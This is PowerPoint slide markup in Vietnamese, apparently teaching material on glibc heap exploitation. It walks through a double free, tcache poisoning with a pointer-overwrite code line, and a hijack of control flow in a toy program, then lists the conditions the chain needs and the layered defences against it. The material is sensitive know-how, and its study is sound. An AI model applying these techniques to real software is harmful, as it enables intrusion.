            <a:off x="6903720" y="3131820"/>
            <a:ext cx="4645152" cy="46177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Sau free(h) lần 2, qword đầu của h bằng chính địa chỉ h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3931920"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="4096512"/>
            <a:ext cx="464515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3 · QUAN SÁT POISONING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="4389120"/>
            <a:ext cx="4645152" cy="46177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Sau </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>*(struct target **)h = t</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, qword đầu đổi thành địa chỉ t</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="5189220"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5353812"/>
            <a:ext cx="4645152"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4 · XÁC NHẬN CHIẾM LUỒNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5646420"/>
            <a:ext cx="4645152" cy="461772"/>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malloc #2 trả về đúng t; t-&gt;action = win, chương trình in [win]</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Hướng 2: phân tích có AI hỗ trợ</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6 · AI ĐỀ XUẤT, NGƯỜI KIỂM CHỨNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="2542032" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Đưa source / binary cho AI (Claude Code, Ghidra qua ReVa MCP)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3035808" y="2121408"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3369564" y="1417320"/>
            <a:ext cx="2542032" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AI chỉ ra cặp free trùng, size class, đường poisoning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5948172" y="2121408"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="1417320"/>
            <a:ext cx="2542032" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AI sinh script gdb / PoC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8860536" y="2121408"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9194292" y="1417320"/>
            <a:ext cx="2542032" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Người chạy lại trong container, đối chiếu bộ nhớ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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457200" y="3108960"/>
          <a:ext cx="11274552" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2194560"/>
                <a:gridCol w="4206240"/>
                <a:gridCol w="4873752"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Tiêu chí</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Thủ công</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Có AI hỗ trợ</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Khoanh vùng lỗi</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Đọc source, đặt breakpoint từng free()</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Hỏi AI dò cặp free không NULL hoá, tính size class</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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Hiểu cơ chế</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Tự thấy next / key đổi trong bộ nhớ</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Có giải thích nhanh, dễ bỏ qua chi tiết</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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Rủi ro</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Chậm, dễ nhầm offset</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AI có thể đoán sai phiên bản glibc, offset, địa chỉ</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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kiểm chứng</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gdb trực tiếp</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Bắt buộc chạy lại trong gdb trước khi tin kết quả</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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731520" y="640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Điều kiện &amp; cơ chế bảo vệ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 8 · cần gì để đi hết chuỗi, lớp nào chặn ở đâu, vì sao vẫn có CVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="27432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NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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7.1  Điều kiện cần</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7.2  Bảo vệ theo tầng</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7.3  Vì sao vẫn có CVE</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Điều kiện để chuỗi khai thác đi hết</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8 · 7.1 · PHẢI THOẢ ĐỒNG THỜI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="11274552" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1417320"/>
            <a:ext cx="10881360" cy="731520"/>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double free → UAF → tcache poisoning → ghi tuỳ ý → chiếm luồng thực thi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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7200" y="2377440"/>
          <a:ext cx="11274552" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="4389120"/>
                <a:gridCol w="6885432"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Điều kiện</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vì sao cần</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Chunk bị free và chunk mục tiêu cùng size class</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tcache/fastbin không coalesce, mỗi bin chỉ phục vụ đúng một khoảng size (mục 4)</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Có primitive ghi vào chunk đã free (UAF hoặc overflow)</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để sửa next/key của tcache_entry; double free chỉ tạo ra UAF, không tự ghi được gì</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Biết hoặc leak được địa chỉ heap, nếu glibc ≥ 2.32</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safe-linking mã hoá next theo địa chỉ lưu trữ; không có leak thì không tạo được giá trị hợp lệ</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kiểm soát được thứ tự malloc() kế tiếp</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entry bị poison phải được tiêu thụ đúng lúc, không bị malloc() khác cùng size class chen ngang</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Chunk tại địa chỉ đích overlap với structure có giá trị</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con trỏ hàm, GOT entry, FILE/_IO_* (FSOP); overlap dữ liệu trơ chỉ dừng ở leak/corrupt</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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Cơ chế bảo vệ theo tầng (1/2)</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8 · 7.2 · ALLOCATOR VÀ OS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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1600200"/>
                <a:gridCol w="3017520"/>
                <a:gridCol w="3200400"/>
                <a:gridCol w="3456432"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Tầng</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Cơ chế</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Chặn gì trong chuỗi</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Giới hạn còn lại / cách lọt</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Allocator (glibc)</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tcache key (2.29+), safe-linking (2.32+), bỏ hook (2.34+), kiểm tra alignment</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Free trùng trực tiếp; giả mạo next không mã hoá; ghi đè hook để nhảy thực thi</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Vẫn lọt nếu có leak heap hoặc overflow đủ lớn để tạo UAF khác</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OS / loader</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ASLR: random vị trí heap, libc, stack mỗi lần chạy</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Không đoán được địa chỉ tuyệt đối để tính mask hoặc trỏ tới hàm libc</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Chỉ cần leak một địa chỉ là suy ra các offset còn lại: tăng chi phí, không chặn</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OS / loader</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PIE: code base của binary cũng bị random</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ROP gadget trong binary không còn ở địa chỉ tĩnh</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Cần thêm info leak cho code base</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CPU / OS</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NX/DEP: stack, heap không executable</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Không nhảy thẳng vào shellcode trên heap/stack</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Buộc chuyển sang ROP hoặc FSOP: đổi hướng kỹ thuật, không chặn hẳn</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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Cơ chế bảo vệ theo tầng (2/2)</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8 · 7.2 · LINKER, COMPILER, RUNTIME</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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1600200"/>
                <a:gridCol w="2743200"/>
                <a:gridCol w="3474720"/>
                <a:gridCol w="3456432"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Tầng</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Cơ chế</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Chặn gì trong chuỗi</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Giới hạn còn lại / cách lọt</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Linker</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RELRO (Partial/Full)</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Full RELRO: GOT read-only sau khi resolve, chặn ghi đè GOT cổ điển</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Không ảnh hưởng hook overwrite (glibc &lt; 2.34) hay FSOP</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Compiler</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Stack canary, _FORTIFY_SOURCE</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FORTIFY có thể bắt một số overflow (vd. strcpy tràn) trước khi tạo UAF</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Không bắt lỗi logic thuần: free hai lần một con trỏ hợp lệ</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Runtime / deploy</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seccomp, sandbox, service quyền thấp</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Giới hạn syscall/tài nguyên sau khi đã chiếm luồng</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50" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Không ngăn khai thác heap; CVE-2026-33824 chạy trong context SYSTEM</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="125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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4572000"/>
            <a:ext cx="11274552" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4736592"/>
            <a:ext cx="10908792"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DEFENSE IN DEPTH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
